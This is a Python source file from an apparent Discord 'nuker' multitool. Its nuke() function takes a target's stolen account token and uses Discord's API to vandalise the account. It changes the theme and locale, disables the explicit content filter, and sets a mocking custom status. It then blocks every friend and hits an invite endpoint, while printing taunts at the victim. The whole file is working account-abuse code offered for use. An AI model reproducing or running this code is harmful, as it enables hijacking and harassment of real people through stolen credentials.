# Stellar Multitool is proudly coded by @prettykills, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @prettykills and @rinfys

from colorama import Fore, Style, init
init(convert=True)
import requests
from util.plugins.pluh import *

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE


def nuke():
    token = input("Enter targets token: ")
    tokencheck(token)
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    settings = {
          'theme': "light",
          'locale': "ja",
          'explicit_content_filter': '0',
          "custom_status": {"text": "I got shit on by stellar!"},
          'status': "dnd"
    }
    requests.patch("https://discord.com/api/v9/users/@me/settings",headers=headers,json=settings)
    userjson = requests.get("https://discordapp.com/api/v9/users/@me",headers=headers).json()
    user = userjson['username'] + "#" + userjson['discriminator']
    slowprint(f"{green}Just nuked {user} sucks to suck lol!!{blue}")
    print()
    quickprint(f"{blue}----------------------------------------")
    print()
    slowprint(f"{green}Blocking all friends...")
    print()
    quickprint(f"{blue}----------------------------------------")
    print()
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    if not friendIds:
            print("Woopsies! This kid has no friends :(")
    count = 1
    headers2 = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    for friend in [friendIds[amount2 : amount2 + 3] for amount2 in range(0, len(friendIds), 3)]:
        for friend in friend:
                try:
                    requests.put(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'],headers=headers2,json={"type": 2})
                    print(f'{green}Blocked friend {count}')
                    count += 1
                except Exception as err2:
                        print(f'{red} Oopsie poopsie! An error has occured: {err2}')
    slowprint(f"{green}Done blocking all friends!{blue}")
    input("\nPress anything to continue...")
    __import__("Stellar").main()
    requests.post(f"https://discord.com/api/v8/invites/visionrs")
